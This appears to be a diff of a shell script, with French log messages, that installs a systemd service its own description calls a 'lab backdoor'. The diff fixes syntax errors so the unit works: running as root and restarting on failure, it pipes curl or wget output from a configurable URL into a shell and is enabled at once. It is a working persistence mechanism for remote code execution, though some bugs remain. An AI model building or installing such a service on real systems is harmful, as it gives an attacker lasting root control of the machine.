@@ -40,12 +40,12 @@ apply_changes(){
   local  url="$DEFAULT_URL"
   log "Ecriture de ${UNIT_PATH}"
   cat > "UNIT_PATH" <<EOF 
-[UNIT]
+[Unit]
 Description=Lab backdoor which downloads and runs $url 
 After=network-online.target
 Wants=network-online.target 
 
-[SERVICE]
+[Service]
 Type=simple 
 User=root
 Environement=PATH=/usr/sbin:/usr/bin:/sbin:/bin
@@ -53,15 +53,15 @@ ExecStart=$SHELL_BIN -c "curl -fsSL ${url} | $SHELL_BIN  || wget -qO- ${url} $SH
 Restart=${RESTART_POLICY}
 RestartSec=${RESTART_SEC}
 
-[INSTALL]
-WantedBu=multi-user.target
+[Install]
+WantedBy=multi-user.target
 EOF
 
   chmod 0644 "$UNIT_PATH"
   systemctl daemon-reload 
   systemctl enable --now "${SERVICE_NAME}.service"
   log "Service ${SERVICE_NAME}.service installé et démarré."
-  systemctl status "{SERVICE_NAME}.service" --no-pager -l || true
+  systemctl status "${SERVICE_NAME}.service" --no-pager -l || true
 }
 
 revert_changes(){
@@ -88,7 +88,7 @@ main(){
     --revert) revert_changes;;
     --status) status_service;;
     *) usage; exit 1;;
-  endac
+  esac
 }
 
 main "$@"
